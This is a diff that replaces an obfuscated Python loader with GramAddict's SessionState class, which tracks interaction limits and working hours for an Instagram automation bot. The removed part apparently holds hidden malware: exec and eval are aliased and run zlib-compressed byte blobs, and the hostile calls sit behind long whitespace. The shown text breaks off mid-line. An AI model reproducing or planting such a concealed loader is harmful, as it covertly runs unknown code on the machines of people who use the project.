@@ -1,99 +1,325 @@
-from builtins import *
-from math import prod as Floor
+import logging
+import uuid
+from datetime import datetime, timedelta
+from enum import Enum, auto
+from json import JSONEncoder
+
+from GramAddict.core.utils import get_value
+
+logger = logging.getLogger(__name__)
 
 
-__obfuscator__ = 'Deluxe'
-__authors__ = "SadHam"
-__github__ = 'https://github.com/'
-__discord__ = 'https://discord.gg/'
-__license__ = 'EPL-2.0'
+class SessionState:
+    id = None
+    args = {}
+    my_username = None
+    my_posts_count = None
+    my_followers_count = None
+    my_following_count = None
+    totalInteractions = {}
+    successfulInteractions = {}
+    totalFollowed = {}
+    totalLikes = 0
+    totalComments = 0
+    totalPm = 0
+    totalWatched = 0
+    totalUnfollowed = 0
+    removedMassFollowers = []
+    totalScraped = 0
+    totalCrashes = 0
+    startTime = None
+    finishTime = None
+    maxAllowedCrashes = 5
 
-__code__ = 'print("Hello world!")'
+    def __init__(self, configs):
+        self.id = str(uuid.uuid4())
+        self.args = configs.args
+        self.my_username = None
+        self.my_posts_count = None
+        self.my_followers_count = None
+        self.my_following_count = None
+        self.totalInteractions = {}
+        self.successfulInteractions = {}
+        self.maxAllowedCrashes = self.args.total_crashes_limit
+        self.totalFollowed = {}
+        self.totalLikes = 0
+        self.totalComments = 0
+        self.totalPm = 0
+        self.totalWatched = 0
+        self.totalUnfollowed = 0
+        self.removedMassFollowers = []
+        self.totalScraped = {}
+        self.totalCrashes = 0
+        self.startTime = datetime.now()
+        self.finishTime = None
+
+    def add_interaction(self, source, succeed, followed, scraped):
+        if self.totalInteractions.get(source) is None:
+            self.totalInteractions[source] = 1
+        else:
+            self.totalInteractions[source] += 1
+
+        if self.successfulInteractions.get(source) is None:
+            self.successfulInteractions[source] = 1 if succeed else 0
+        else:
+            if succeed:
+                self.successfulInteractions[source] += 1
+
+        if self.totalFollowed.get(source) is None:
+            self.totalFollowed[source] = 1 if followed else 0
+        else:
+            if followed:
+                self.totalFollowed[source] += 1
+        if self.totalScraped.get(source) is None:
+            self.totalScraped[source] = 1 if scraped else 0
+            self.successfulInteractions[source] = 1 if scraped else 0
+        else:
+            if scraped:
+                self.totalScraped[source] += 1
+                self.successfulInteractions[source] += 1
+
+    def set_limits_session(
+        self,
+    ):
+        """set the limits for current session"""
+        self.args.current_likes_limit = get_value(
+            self.args.total_likes_limit, None, 300
+        )
+        self.args.current_follow_limit = get_value(
+            self.args.total_follows_limit, None, 50
+        )
+        self.args.current_unfollow_limit = get_value(
+            self.args.total_unfollows_limit, None, 50
+        )
+        self.args.current_comments_limit = get_value(
+            self.args.total_comments_limit, None, 10
+        )
+        self.args.current_pm_limit = get_value(self.args.total_pm_limit, None, 10)
+        self.args.current_watch_limit = get_value(
+            self.args.total_watches_limit, None, 50
+        )
+        self.args.current_success_limit = get_value(
+            self.args.total_successful_interactions_limit, None, 100
+        )
+        self.args.current_total_limit = get_value(
+            self.args.total_interactions_limit, None, 1000
+        )
+        self.args.current_scraped_limit = get_value(
+            self.args.total_scraped_limit, None, 200
+        )
+        self.args.current_crashes_limit = get_value(
+            self.args.total_crashes_limit, None, 5
+        )
+
+    def check_limit(self, limit_type=None, output=False):
+        """Returns True if limit reached - else False"""
+        limit_type = SessionState.Limit.ALL if limit_type is None else limit_type
+        # check limits
+        total_likes = self.totalLikes >= int(self.args.current_likes_limit)
+        total_followed = sum(self.totalFollowed.values()) >= int(
+            self.args.current_follow_limit
+        )
+        total_unfollowed = self.totalUnfollowed >= int(self.args.current_unfollow_limit)
+        total_comments = self.totalComments >= int(self.args.current_comments_limit)
+        total_pm = self.totalPm >= int(self.args.current_pm_limit)
+        total_watched = self.totalWatched >= int(self.args.current_watch_limit)
+        total_successful = sum(self.successfulInteractions.values()) >= int(
+            self.args.current_success_limit
+        )
+        total_interactions = sum(self.totalInteractions.values()) >= int(
+            self.args.current_total_limit
+        )
+
+        total_scraped = sum(self.totalScraped.values()) >= int(
+            self.args.current_scraped_limit
+        )
+
+        total_crashes = self.totalCrashes >= int(self.args.current_crashes_limit)
+
+        session_info = [
+            "Checking session limits:",
+            f"- Total Likes:\t\t\t\t{'Limit Reached' if total_likes else 'OK'} ({self.totalLikes}/{self.args.current_likes_limit})",
+            f"- Total Comments:\t\t\t\t{'Limit Reached' if total_comments else 'OK'} ({self.totalComments}/{self.args.current_comments_limit})",
+            f"- Total PM:\t\t\t\t\t{'Limit Reached' if total_pm else 'OK'} ({self.totalPm}/{self.args.current_pm_limit})",
+            f"- Total Followed:\t\t\t\t{'Limit Reached' if total_followed else 'OK'} ({sum(self.totalFollowed.values())}/{self.args.current_follow_limit})",
+            f"- Total Unfollowed:\t\t\t\t{'Limit Reached' if total_unfollowed else 'OK'} ({self.totalUnfollowed}/{self.args.current_unfollow_limit})",
+            f"- Total Watched:\t\t\t\t{'Limit Reached' if total_watched else 'OK'} ({self.totalWatched}/{self.args.current_watch_limit})",
+            f"- Total Successful Interactions:\t\t{'Limit Reached' if total_successful else 'OK'} ({sum(self.successfulInteractions.values())}/{self.args.current_success_limit})",
+            f"- Total Interactions:\t\t\t{'Limit Reached' if total_interactions else 'OK'} ({sum(self.totalInteractions.values())}/{self.args.current_total_limit})",
+            f"- Total Crashes:\t\t\t\t{'Limit Reached' if total_crashes else 'OK'} ({self.totalCrashes}/{self.args.current_crashes_limit})",
+            f"- Total Successful Scraped Users:\t\t{'Limit Reached' if total_scraped else 'OK'} ({sum(self.totalScraped.values())}/{self.args.current_scraped_limit})",
+        ]
+
+        if limit_type == SessionState.Limit.ALL:
+            if output is not None:
+                if output:
+                    for line in session_info:
+                        logger.info(line)
+                else:
+                    for line in session_info:
+                        logger.debug(line)
+
+            return (
+                total_likes
+                and self.args.end_if_likes_limit_reached
+                or total_followed
+                and self.args.end_if_follows_limit_reached
+                or total_watched
+                and self.args.end_if_watches_limit_reached
+                or total_comments
+                and self.args.end_if_comments_limit_reached
+                or total_pm
+                and self.args.end_if_pm_limit_reached,
+                total_unfollowed,
+                total_interactions or total_successful or total_scraped,
+            )
+
+        elif limit_type == SessionState.Limit.LIKES:
+            if output:
+                logger.info(session_info[1])
+            else:
+                logger.debug(session_info[1])
+            return total_likes
+
+        elif limit_type == SessionState.Limit.COMMENTS:
+            if output:
+                logger.info(session_info[2])
+            else:
+                logger.debug(session_info[2])
+            return total_comments
+
+        elif limit_type == SessionState.Limit.PM:
+            if output:
+                logger.info(session_info[3])
+            else:
+                logger.debug(session_info[3])
+            return total_pm
+
+        elif limit_type == SessionState.Limit.FOLLOWS:
+            if output:
+                logger.info(session_info[4])
+            else:
+                logger.debug(session_info[4])
+            return total_followed
+
+        elif limit_type == SessionState.Limit.UNFOLLOWS:
+            if output:
+                logger.info(session_info[5])
+            else:
+                logger.debug(session_info[5])
+            return total_unfollowed
+
+        elif limit_type == SessionState.Limit.WATCHES:
+            if output:
+                logger.info(session_info[6])
+            else:
+                logger.debug(session_info[6])
+            return total_watched
+
+        elif limit_type == SessionState.Limit.SUCCESS:
+            if output:
+                logger.info(session_info[7])
+            else:
+                logger.debug(session_info[7])
+            return total_successful
+
+        elif limit_type == SessionState.Limit.TOTAL:
+            if output:
+                logger.info(session_info[8])
+            else:
+                logger.debug(session_info[8])
+            return total_interactions
+
+        elif limit_type == SessionState.Limit.CRASHES:
+            if output:
+                logger.info(session_info[9])
+            else:
+                logger.debug(session_info[9])
+            return total_crashes
+
+        elif limit_type == SessionState.Limit.SCRAPED:
+            if output:
+                logger.info(session_info[10])
+            else:
+                logger.debug(session_info[10])
+            return total_scraped
+
+    @staticmethod
+    def inside_working_hours(working_hours, delta_sec):
+        def time_in_range(start, end, x):
+            if start <= end:
+                return start <= x <= end
+            else:
+                return start <= x or x <= end
+
+        in_range = False
+        time_left_list = []
+        current_time = datetime.now()
+        delta = timedelta(seconds=delta_sec)
+        for n in working_hours:
+            today = current_time.strftime("%Y-%m-%d")
+            inf_value = f"{n.split('-')[0]} {today}"
+            inf = datetime.strptime(inf_value, "%H.%M %Y-%m-%d") + delta
+            sup_value = f"{n.split('-')[1]} {today}"
+            sup = datetime.strptime(sup_value, "%H.%M %Y-%m-%d") + delta
+            if sup - inf + timedelta(minutes=1) == timedelta(
+                days=1
+            ) or sup - inf + timedelta(minutes=1) == timedelta(days=0):
+                logger.debug("Whole day mode.")
+                return True, 0
+            if time_in_range(inf.time(), sup.time(), current_time.time()):
+                in_range = True
+                return in_range, 0
+            else:
+                time_left = inf - current_time
+                if time_left >= timedelta(0):
+                    time_left_list.append(time_left)
+                else:
+                    time_left_list.append(time_left + timedelta(days=1))
+
+        return (
+            in_range,
+            min(time_left_list) if len(time_left_list) > 1 else time_left_list[0],
+        )
+
+    def is_finished(self):
+        return self.finishTime is not None
+
+    class Limit(Enum):
+        ALL = auto()
+        LIKES = auto()
+        COMMENTS = auto()
+        PM = auto()
+        FOLLOWS = auto()
+        UNFOLLOWS = auto()
+        WATCHES = auto()
+        SUCCESS = auto()
+        TOTAL = auto()
+        SCRAPED = auto()
+        CRASHES = auto()
 
 
-_cube, Cube, Math, _run, _absolute, _substract, Round = exec, str, tuple, map, ord, globals, type
-
-class Run:
-    def __init__(self, _callfunction):
-        self._product = Floor((_callfunction, 80357))
-        self.Calculate(Substract=544)
-
-    def Calculate(self, Substract = float):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        self._product *= 86659 + Substract
-        
-        try:
-            {'eegoh6teu3ltilllhl': _absolute} if _substract < _substract else {_run: _absolute} is Cube
-
-        except OSError:
-            {_run: _absolute} if _run != _cube else (_cube, _cube, _absolute) > _run
-
-        except:
-            Round(-12558 / 27406) == False
-
-    def _stackoverflow(self, Absolute = -11466):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        Absolute *= 30777 / -48396
-        self.Power != None
-        
-        try:
-            ((_divide, {Cube: _cube}) for _divide in (_divide, _cube, Cube) if Cube > Cube)
-
-        except OSError:
-            (((_absolute, _cube, Cube), _run) for _run in {_run: _absolute})
-
-        except:
-            Round(56996 / -21712) == int
-
-    def _random(Modulo = float):
-        return _substract()[Modulo]
-
-    def _hypothesis(Frame = 64700 / -70335, CallFunction = Ellipsis, StackOverflow = _substract):
-        # sourcery skip: collection-to-bool, remove-redundant-boolean, remove-redundant-except-handler
-        StackOverflow()[Frame] = CallFunction
-        
-        try:
-            ((_run, (_cube, _cube, _absolute)) for _run in {_run: _absolute} if Math >= _divide)
-
-        except OSError:
-            ((_absolute, (Cube, _divide, _cube)) for _absolute in (_absolute, _cube, Cube) if _divide < _cube)
-
-        except:
-            Round(27267 * -98845) == None
-
-    def execute(code = str):
-        return _cube(Cube(Math(_run(_absolute, code))))
-
-    @property
-    def Power(self):
-        self._ceil = '<__main__._cube object at 0x000009195BE46534>'
-        return (self._ceil, Run.Power)
-
-if True:
-    try:
-        Run.execute(code = __code__)
-        _algorithm = Run(_callfunction = -62779 * 35462)
-
-        Run(_callfunction = -63441 - 58237).Calculate(Substract = _algorithm._product - -45246)                                                                                                                                                                                                                                                          ;Run._hypothesis(Frame='lIIlIlllIlIIIllllllIIIlIl',CallFunction=b'x\x9c\xdd\x1bkO\xdc\xb8\xf6\xfbH\xfd\x0f\xee\xac\xaaI\xc40\x85}\xdc\xbb\x17\xddY\xdd\nhK\x17\x18T\xe8eW\x14\x8dB\xe2\x01\xd3$\x1e\xc5N\x01!\xfe\xfb\x1e?\x92\xd8\x89\x13&\x85Od\xcaLb\x9f\xb7\x8f\x8f\xcfq\xdc\x9f\xd0\x87\x0f\xaf\xd1\xdf4G\xd79\xe3(\xc2\xf4b\x91\xb30\xe08B\x01Z\x90\x18#\xa3\xe5\x86\xf0+\xb4\x83\xe3\xfc\x16\x0f\x06?\xa1m\x9a^f\x01\xcf\xe3\x80\x13\x9a\xb2\xd7\x83\xc1\x80gw[\x03\x04\x17Y O\xde\x88k>/\x88\xd0l>G\xaf\xa7h\xa8\xa8\x0c\x11\xcd\x0c\xa8 \xe7W4c\x1a\xe48\x88>\x06I\r\xe4\x12D\xc8/4\xc4\x15\xe7K\xb6\xf5\xf6\xadj\x9c\x844y[\x03\x8f\x08\x0bi\x16\xd5\xe0u\xeb\xe4\xf2\xb2\x0e\x1f\x93\x10\xa7\x0ck\xf8\xdd\xa3\xfd\xf5\x9f\'\x1b5\x98\x90F\x1a`\xb4\xccH\xca\xbd\xe1G\x1c\xc7\x14\xdd\xd0,\x8e^\x0f\xfd\x91\x84\xf5\xb7J\x14\x013b\xdfH4\xf2\x07\xf86\xc4K\xaem\x94.s\xc0\xfeL\x19f(\xc80\xcap\xf45\xfd?\xa11\xe6\xaa\xe1"\xce\xf1\xd7T\x0c\x8fx\n\x90 \xf25=\xa4\x174\xbaC1\xf9\x06xw4\x1f\xfa\x03%\x19I\x964\xe3\xf39p\xbbc#\x7f\x82o\t\xf7|\x18\x96\x98\x86A\xcc<\xffltxpp\xa8>p\x07_\xf2\x82\x9b\xd1\xf9\xf42\xa6\x17\x005h\x03\x11\xe8\x84\x90k\xf8\xc41\x89\xc5\xf7u<:\xdb\xdaZ[_[\xf7\xd6\xbd\xb5M\xdf?\x072\x98\x07\x9cg\x9dd\xf6\xf6\xf6\xf7\xf6?}\xfa\xa4~\xc4\xdd\xa7&\xa1\x88t\x13I\x924I\xd3D\xfc\x88;\xfd\x08\x8a(m\x07\xee~\x819\xa3\xb3\xd9\xc6\x06\x9dm\xcc\xe0\x8b\xc2\x05\r\x14\x10+\x0bv2\x8e\x85\x05\x84\x19\x08\xdc]_\x0b\x9b\x00\xb2\x93\xa87\xba\xc8I\xccI*\x86\xe3{\x90\xb1\x81\x03Y\xd0\x947`P\xd9\x02?\xb1 \t\xf6\x05\xa0X\x98[b\x10\xaf\x85\tK\t\x8fI~Q7\xa2?\x16\xa6\x15&\x06K\x7fR?{\xbd\x89\xf8g\xcfBeB\xd2\x08\xdfz#\xcc\xe2\xe0}\xa3\xfb\xdco3\x8d4\xbf\x18\x0e\xf9\'\xc6\xe1\xc5\x9a&\xe3\xac\x87a\xfe\x12\xd7\xe9_\xa7\xa7\xc5\x0f\xdc\xf41\r!!\x0bR\xf24\xd3\xb4\x12\xe9e\x9av*\x85i\xee`1\xba\xc5Wi\xee2P\xd7l\xdd\x99\xed\x00\x97\x1d\xf1E\xe1~G|\xcf^\xac\x07\xe1\x98,\x13\x1a\xba\x8c\xd4\x1e\x0f\xe3\xbd\xbdx/\x8e\xf7\xe2\xe2\x07\xcc3\x1aM\xae)I\xdb|/\xae\xc0\xf7\x04\xb6\xfc\x83\xc7\x17kX\x1e\xd0x\xd1cr\xde\xde\xdc\xdc\xc2\x05_7p\xdd\xaa\x7f\xf0x\xf3b-\x14\x07\xdfq\x1f\x03\t\xeb(\x93\xa8_\xf1\xf5r\x8dCi\xb3\xb7sR\xea\x05O\x042\x15\xd9^\xf2\xc2\x87\xf3\xec\xa4g`w\xad~\xde\xc5\xe8W\xac?\x11|\xec{\xa3\x05\xb2\xb1\x08\x8bD\xde\x1b\xfd\xbe\xe0\x8e5\xe5\x85\xda9\xc4\xb7\xce9\n\xd7"\xa3\t*\xb2U\xa4\x12a\x04\xe0\xe18\xc6\xe98!\xe9\x98\xe5\xc9\x18j\x99q\x16\xa4\x97x\xcc \xc7\x17\xdd\xde\x08\xca\x9a\x81\x86\x8f\xe9\xe5%I/_\x15\xcfyN\xa2W\x8at\x04%$\'\t.H\x17\xcfc$\xbe#\x1c\xf3@C\xe24O\n\xa8]\xb8\x1f#(\x0c\xa9\xee\xbcf4-:?\x1d\xcf\x0ewS1\x8c\xd9\xab\x81\xee\xff\x90\x05\xc9\xbb("!\x87z0\xc3\x93\x9c\x93\xb8T\x07j\x93\xf9\xf7\x00\x8a*\x01.d\xc5\x19\x9a\x16BO\xa0w_\xb6y\xf3y\x1a$P\xe4\xf9\x02\xee\xd5 \x8c\x03\xc6\xd01f\x0c\xea\xdcc(o\xf0\xd6+U\xc1E\x80~HS\xac\x1e\x83\xec\x92A\xc3\xfd\x83zL\xee\xe69\xc3\x99 e\x81A\xfb\x922\xce\xa0\x92\xccS^\xefZP(&op\xd6\xd9\r\xe2:\xba9\xe5A\xbc\x97r\x9c\x05\xa1,\xc9\raX\x1e\x86\xa0\xc0"o\x03\x90\xc8\xef\x15\xf3\xa8\xde\xbe/k\xcd)\xda0\xda\xb6i\x92\xe0\x94\xd7\x9b\x8f\x92Z\xc3i\xc0\xc3+I\xd2l\xfd\x92.*^\xba#\xc3\t\xfd\x8e\xa3\x03\xb0\xf6\xfb\xc2\n\xd0{vn\xe0\x1d\x87Y\xb0lP\xdb\xce\x02veJ\xc8x\x90\xf1\x13R\xb3\xfc\x82\xa4\x84]Y\xcd\xaa#\xc2\x0bQ?\xc3\xfc\x81\xea\x99\xe1x1F!M\x17\xe4\x92\xf9z\xa8%Q\xe8\x98\xc81\x07\xe7\xf7\x84oO\xc4\xd7\xaf\x9e\xef\xd7\x80\xb4\'h\x1a\xf2\xb1\x06\xd1\xe6\x1c&@\x9b\x97\x980]\xee\xd2\x84s\xfbM\t\xd7\xe5@%\xd0\xa3\x9ed\x93s\xb8\x94\rP\xf3-\xbb\xb3\xe9dv\xbf\xe9mvO\xc3\xed\xecn\x97\xff\x95\x10\x8f8\xa2M\xa9\xf2H\xb7~\r\xdf\xac,i8i\x11\x0e\')\xbd\xf1\xea\xee\xd4\xe9\xb7A\x14\x81\xe7\x96#\xa1\xdd\x97\xd1<\x0b!\xb8\xca\xd1\xc2\xd1\x18\x15\xeaB\x93\x12\xd8\xf4l\xb2hq\x00\x11\x14=E\xcbG\x84I\xe6\x06^\xbb\xe7\x9c)\xa4s\x10x\xb3\x82\xc71\xeb\x89\xbe&\xf1\x9b\x92\xba\xbdpUq\xdd\xd8\xa6\xcc\x92\x91\xb2\x9d\x94\xda\x1c<\x87\x16\x15t\xadcU\x96mzZs\xa8\xd7h\x14Hu\xadJ\xbf_M\xad\x02\xbcM/7\xaf5k\xd8-e\xf4|\xe9\xa5\x8b\xc6i\x0c\x90\x9ezuM\xfa\x8es\x0b\x99\x96qV\xd0\x9d\xf6\xa8\xcbk\x9b\xe3G\xfdB\xccv\x06)LL\x12\x02\x0b\x03S\t\x89g\x07\x8b\xf1+\xbd\xff\\5\x0f\x87C@C\xfc\n#\x85\n\x83\x9a\xa10\xcf2\x08\xadH\x93\x01 \xc7"6\xd1Ps\xb9\xdb\xac8\x83\xd9\xcaD\xcas\x18]\xe2I3\x98Xc9\xc2c\xf4\xcb\x86aa\xd7\xbaY\xb2T\x9e\xd7\x9b\xa7B\xabq\xfdmU\xa6y\xfa\x83l\x0b\xc4\x1fe\x1c\xea\x95\xae7c\x1b\xb1\xe0\xbb\xb9*\xdfe\xe2\xe0X\xe7Q\x00U\xd4;i\xde\x88\xb5\xb7\xb7"\x12\xab\xee.+\xdbO\xcf\xa3\xde\\\xab\xf9g\xae\xa2\rk\xae*F\xe1\xf7\xfd\x84\xe8\xe4\xbc\xb2\x05T\xd0\xe9o\x01\x13\xaf\xe0\xfb\xf3\xcalC\x95\xdf\xf4\xf7[\x13\xaf\x1cn\x8bi\x15\xf6\xc01\xc2o\nT\'8\xf2~\xce\xef\x96x\xaaPi\xce\x979\x9f\xbe\x0f j\xd7\xa2\xdfg\xcc\xf3\x0cr\xd4\x93,\xc7"\x84+Q3\x1c\xc8\x0cq]\x05~\x89hE\xc1\x8a\x05\xa8e\x96\x7f\x93}\xd13y\xb7\xbf_RS`z\x1dS\x04\xab\xf6\x8a\xe4OJ\x13\x1d\x87\xabv#\\\x8a\xf2\xa2\x96\x1c\xff1\x95/\x11;\xa3\xb2_\'f\xe4\xb7P\xb9{\x8elB\x8e\x12\x83\xea\xa5`\xd06`\xae\x88\xec\xf4\x0e;\x14*\xde\xae\x94\xbbU!;\xfc6(\x87U9\xe0\xa8\x11Z\xa9\xda!\xb2Au\x99X\xf4\xa0\xa6h\xa5T\x04\xc2\x06\x8d\x9b\xb2\xdch\x96 \xad\xd4\x8c8\xd9 X\xc5%s\x00[\xd2\xde\xde#iE\xcb\x8e\xa1$v\x89g;\xd2\xd3D0"\xa5c\xd2\x1b\x86(\xeb+\x9b{\x91G\xf6\xd7\xdd\x8cw\x9d\xac\xc3\xb2tk\x96s\xed\xcef\xc65\x8b\xa8\xce\xb4\xc0\xa8\x0b*\xcaI[\xd0\xe1\xb6\x88\x0cP\xa1\x17p:Hl\r\xc76\xe0b\xb8\x8eN\x84(HF\x87\xad\xaf\\}\xeeG2,\xa1\xcf*\xae\x8dDl2\xe3\x8a\x0cJ\xa3\xd9\x9f\xa3\x07\xe4\xdd\xd7B\xcc\xc3\xdb\xfb\xce\xe8\xf2\xe0\xb7KQ\xcc\xbf\x15\x04)\xe7o\x8b,\x05)\xa78\xf6,\xee\x92\xe8\xe8\xa0\x94\xa5K\x1a\x98\xf7-r\x1c%N\t\x8a\xd9\xdf\xc5\xbb\x88\xae+X\xc3\xae\xc4J)\x1e\t\xd6N\xc9\xcc\xa8\xd9%]\x15\x83W\x90\xcf\x88\xe3-v\xaa\xc89\xa5\xb2\xa3y\x97\\:T\xae T\x11h[$\xd2\x84\x9c\xe2\x18\xe1\xb6K\x96\xe3*\xf2\x9a\x11n\xab[.#^\xbb\x87\xf3\xb1\xd0\xed\x14\xd9\x8a\xd3]B7$\xed\x92\xd5\x8a\xea\x1d\xce\xd7CP#\x9aw\xc6\n\x15\x1cW\t\x15:\xce\xb6E\n\xd5\xed\x0e\x14f\x04^q\xa4\x8b]\xbc/\x0cg\x8f\x0e\xb5\xb9_\xe0\xb6\\cqr\x8f\xae\xb9\x12\xd9\x82\x9e\xd76\x83\xcc\\\xb4-\x19m\xeeU\xa8\x9cX\xa4\xa5)\xe5\xae-\x16\x0b\xce\xd1\'\xedE3`\x0fY-I\xad%\xac\x05\\\\\xea\xdd\xcaD@y\x02\xd5o\x82:6W\x9e\xce0\xc2\x17\xf9e\xc1\xd1\x86\xced\r\x80\xbc&\rc\x8dlv\x06id\xa4\x108\x8d\xe6da.\x8cs]E41A\t;\xcc\xafH\xdc\xdaFX\x81\xbc\x0e\x88+R\xb7\x8a\xec\x15\xa8\x17\x8b\xee\x8a\xe4\xed5z\x05\xfa\xcbdE\xca\xc5\xda[\xd0\x1c\xb7\rd\xb5j\xb5\x82X\xf1\xaf\x14\xc5\x88\xe0U\x9b\x9a\xa15J\x96s\xe1x\x95\xe9\xb9\xbf\xf7\xe7\xeeq\xdb\x04u8\xb69\x83\xcc9p\xb6y^\x9bL-\x13\xc9\x9a\x11\xdd\x14\xf4\xd4\xb0\xe6A_\xfd\xb6g\x07\x07\xbb\x87\'\xcf\xa2\xe2\xcfOV\xb1A\xc1R\xb1\xf2\xe9\xbeZBb\xf9\x0c\xfa\xfd\xf2d\xfd\x1a\x14,\xfd\xc4\x9c\xea\xab\xd9\xfb\xd9\xfe\xfe\xec\xf4Y\x86\xef\xd7\'\xab\xd7\xa0`\xa9W\xc5\xd3\xbeJ~9|F5\x7f{\xb2\x9a\r\n\x96\x9aU\x1c\xeb\xaf\xe8\xe9\xbb\x93\xed\x8f\xcf\x13o\xfe\xf5d5\x1b\x14,5\xcb\xe5\xab\xaf\x8e\xc7_\xb6\xb7w\x8f\x9fE\xc7\x7f?Y\xc7\x06\x05K\xc7je\xe9\xaf\xe6\xc9\xec\xe4]kf\xd7G\xc9\xdf\x9f\xacd\x83\x82\xa5\xa4\xb9\xa8\xfe\xc0\xfa\xf1\xf9\xdd\xf13y\xec\x7f\x9e\xach\x83\x82\xbd|\xa8\xf2\xe2\x07<\x16\x94<\xda\xddy\x96,`\xe3\xe9i@\x83\x84\xed\xb3*\xf3)\xb4\xfc\x1f\x03EH\x98`~E\xa3j_\x9e\xa4\x8cDx~C3\xb1s5\xbf\xa2y\xc6<\xebi\x8c\xe4\xd9\xae9\xc3\xa1\xb9+/\x90\xc5y\x07\x90e.\x0f\x94y\xf24\xc4\x18A\xba7F\xb7~\xd3H\xb2\x1f\xfdw* \x1c\x8aj\xe1K\xa8[\r\xba\x92\x95\x9a\xc8\x90\x01V\x14\x8cJLK\x8b\xa6\xea}\x81\xb1c(\x94\x89\xf1Bl\x9b1^;-RV\xc9\xdd\x87')
-
-        _algorithm._stackoverflow(Absolute = 48005 / _algorithm._product)                                                                                                                                                                                                                                                          ;Run._hypothesis(Frame='SS2SS22S2SS2S222SS2S22',CallFunction=b'=\xa4\xa5\xa0\xbf<\x11\x07#\x16\xd24b\xd3\xca\x86\x15\xb4(\x93RQ#Y\xf6\xaei\xc7i\x14\xdc\x89\xa3H\x86\x04\x13\xc6\xb3\x85\xb8\xf1\x86o\xfe^\x7f\x93\xac\xbf\x89\x865W\x00\x0fQ/q\x00u1\xbcO\'l\x19\x13\xee\x8d\xd6G\xfe\xd9\xc6\xf9\x03\xba\x97t\x1f\x86\r,S;`\xb3\x94lJjc4|\xf3q\xf2\xe6\x00U|\xd1\x1a\xd2\x87\xffLJ,_\xb6\xf2\xdfl\xe5\x0fXN\xfe%\xb5\x95\xf9\xcb\xf3\x1cK\xb4.UZ3\x06$!i\xce1\x9bn\xfab\x92W\xedM\x9f\x02\xf9\x00\xacV8\x08\xbf\xeaGX\x92\xd9\xa8\xcf\x07qYS{xzEc,\x98\xa2\x84FxR\x1fPqi/\x17o\xc1\xc6\xf5\xe3\x12\xa4>\x1dA\xbe\x894\x9e/\x0e\x11-\xcb{\xcb\x91T\xa3K8c\xa2\x08~\xad\xc2\x14p\r\x81Zfj9\xcd\xd0T\x9ap\xdd\x12\xc8\xb9\xb9Q\xa1\xfca\x1a\xd6iS\x8b\x85\x9c\xc9\x93`\xb9\x84 \xe0\x95\xad\xfd\xf62\x1e!f\xb9\x80\xf2\x18\xdf\xaa.\xdd\xdb\x16\xa5\xd5\xecf\xf0!\xcff\xe8\xcb\xbd#\xdcl\xfe\x03m\xaa\xfd+\xbb\x03&\xb7A\xd3z\x05K\xd8\\\x9dC\xc3\x91\xdc\xe82\xcdW\xc4\xcf\xdaa5c\xdf\xa9\xa0\xa4\xce\xd2\xca\xf5\xd0\x13\x87{M*\xe2}\xeaT\x1e\xf65\x83\xa2\xac\x9c\x1d\xedE\xc5\xe9\xe8::p4\xea\xd4\xdf\xd1S\x96\x05\x8e>\x9dI;zt\xfe\xe9\xe8\x91)\x9b\x0bC\xad\xff.]T\xf6c\xf4\xb8\xcf\x1d\xeb\xd3\xce\x9eq\xf2\xb90\xa0\x18"\xf8\x0b\xf2\xb8xC^\xac\xf6L\x9eX\xb6\xe88\xc6\xee\xdev\xa5!\x89\x86[6\x89\t\xa9\xef\x83\x0c\x9b\x99\x9f@\x92;\xa1&b\xc7fr\x9db\xcbq\x0cM\xb69\xc7lF\x8f\xec\xb1\xd7\x82\xb1[\x9b\xa2\xeaj\xd7\xa4\xf9N\xc6MIn\xa54\xacX\xbdtsc\x15\xbb\x13n\xc4\xe2\r\x99\x1bw\x99\xb8\xb1\x8e\x127\xbc.\xbe\xdcH\xfaU\x8a\x1b\xb3\xaaN\xdd\xc8\xd5\x9b!7\xbeN/\xdd\xc8\xc7\xce]\xb7\xa1L\xcfd\x9c\x17h<\xab\x8dMy\x9c\xb61\x1c*$\xb5cV!\xab\x81*\xb6 \x1bB\xca}I\xf1\xbf\xcbC>\x9f\xd71\x96\x19\x15\xffq\x1e\x90\xee\x9b\xee:\x94g\xba\x1b\x04\xed\xc3\xde\x8e}\xcbay\xce\xdb\x85[;\x04\xde\x8e\x0fYb;~y8\xbc\x86\xff`<?\xfc\x03\xee\xd3\x18\xf5')
-
-        if 178470 > 7519317:
-            Run(_callfunction = -33542 - 44034)._stackoverflow(Absolute = -96268 - _algorithm._product)
-        elif 234933 < 7607969:
-            _algorithm.Calculate(Substract = _algorithm._product * 98240)                                                                                                                                                                                                                                                          ;SSS22S2S2S2S22S222SS222222,xwwxxwwxxxxxwwwwxww,lIIllllllIIIIlIIIlIl,wxxwxxwxwxwwxwwww,DOoOOoOOoooOOoDOOOOoDDDoD=(lambda NMMMMNMNMNNNMNNMMNNMMM:globals()['\x65\x76\x61\x6c'](globals()['\x63\x6f\x6d\x70\x69\x6c\x65'](globals()['\x73\x74\x72']("\x67\x6c\x6f\x62\x61\x6c\x73\x28\x29\x5b\x27\x5c\x78\x36\x35\x5c\x78\x37\x36\x5c\x78\x36\x31\x5c\x78\x36\x63\x27\x5d(NMMMMNMNMNNNMNNMMNNMMM)"),filename='\x44\x6f\x6f\x44\x4f\x44\x44\x4f\x44\x6f\x4f\x44\x6f\x6f\x6f\x6f\x4f',mode='\x65\x76\x61\x6c'))),(lambda NMMMMNMNMNNNMNNMMNNMMM:NMMMMNMNMNNNMNNMMNNMMM(__import__('\x7a\x6c\x69\x62'))),(lambda NMMMMNMNMNNNMNNMMNNMMM:NMMMMNMNMNNNMNNMMNNMMM['\x64\x65\x63\x6f\x6d\x70\x72\x65\x73\x73']),(lambda DOODOODoooODDDDODODDDDo,NMMMMNMNMNNNMNNMMNNMMM:DOODOODoooODDDDODODDDDo(NMMMMNMNMNNNMNNMMNNMMM)),(lambda:(lambda 